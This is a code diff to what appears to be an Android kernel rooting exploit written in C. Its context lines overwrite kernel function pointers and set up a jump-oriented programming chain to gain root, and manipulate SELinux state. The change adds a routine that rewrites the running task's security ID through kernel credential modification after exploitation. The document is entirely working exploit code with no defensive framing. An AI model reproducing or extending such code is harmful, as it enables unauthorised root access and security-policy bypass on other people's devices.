@@ -294,6 +294,7 @@ static int write_at_address(void* target, unsigned long targetval)
 
 static int selinux_enabled;
 static int selinux_enforcing;
+static struct thread_info* ti;
 
 static void get_selinux_state(struct offsets* o)
 {
@@ -319,7 +320,6 @@ int getroot(struct offsets* o)
 {
 	int dev;
 	int ret = 1;
-	struct thread_info* ti;
 
 	printf("[+] Installing func ptr\n");
 	if(write_at_address(o->fsync, (long)MMAP_START))
@@ -346,7 +346,6 @@ int getroot(struct offsets* o)
 	int ret = 1;
 	int dev;
 	long fp;
-	struct thread_info* ti;
 
 	printf("[+] Installing JOP\n");
 	if(write_at_address(o->check_flags, (long)o->joploc))
@@ -378,6 +377,12 @@ end:
 	return ret;
 }
 #endif
+
+
+static int restore_sid(void)
+{
+	return modify_task_cred_uc_sid(ti, get_last_sid());
+}
 
 int main(int argc, char* argv[])
 {
@@ -435,6 +440,9 @@ int main(int argc, char* argv[])
 
 		printf("    [+] Restore SELinux\n");
 		set_selinux_state(o, selinux_enabled, selinux_enforcing);
+
+		printf("    [+] Restore SID\n");
+		restore_sid();
 	}
 	
 	return ret;
